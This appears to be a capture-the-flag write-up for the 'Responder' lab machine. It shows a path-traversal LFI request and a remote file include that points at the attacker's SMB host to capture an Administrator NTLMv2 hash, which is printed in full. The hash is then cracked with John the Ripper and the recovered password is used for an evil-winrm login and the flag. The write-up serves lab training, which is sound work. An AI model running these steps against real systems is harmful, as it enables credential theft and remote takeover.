###Responder room

First is to check if it is vulnerable to LFI attack.

`http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`

WE can see the result

````
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names.
# Each entry should be kept on an individual line.
The IP address should # be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one # space.
#
# Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol.
# # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
````

We then open our responder

`responder -I tun0`

and we will do RFI (Remote File Include)

`http://unika.htb/index.php?page=//10.10.14.215/aaa`

and on our responder we can see the `NTLMv2` of Administrator

```
Administrator::RESPONDER:fdea865f07bc2668:546E83868F3EAEC154C019873ED904AA:
010100000000000000E1DFC8BAFDD901B0CFC75372BD4F57000000000200080033004800350
0490001001E00570049004E002D00550036004F005A00340033004B004C00310054004D0004
003400570049004E002D00550036004F005A00340033004B004C00310054004D002E0033004
800350049002E004C004F00430041004C000300140033004800350049002E004C004F004300
41004C000500140033004800350049002E004C004F00430041004C000700080000E1DFC8BAF
DD9010600040002000000080030003000000000000000010000000020000084188D94109414
8508741E1E1D0CBD2DA83FD99D4773C1A23859AE3F781BCA2D0A00100000000000000000000
0000000000000000900220063006900660073002F00310030002E00310030002E0031003400
2E003200310035000000000000000000
```

We then save the whole result and save it in a text file and we will use `john the ripper` tool to crack the the hash and retreive the password.

`john -w=/user/share/wordlist/rockyou.txt hash.txt`

```
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2023-10-13 09:53) 33.33g/s 136533p/s 136533c/s 136533C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

We can see that we cracked the password.

We then use `evil-winrm` to connect to the machine.

`evil-winrm -u administrator -p badminton -i 10.129.88.25`

By going to Users folder we can see another user `mike`, we can then see the flag on the Desktop folder

`Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac`

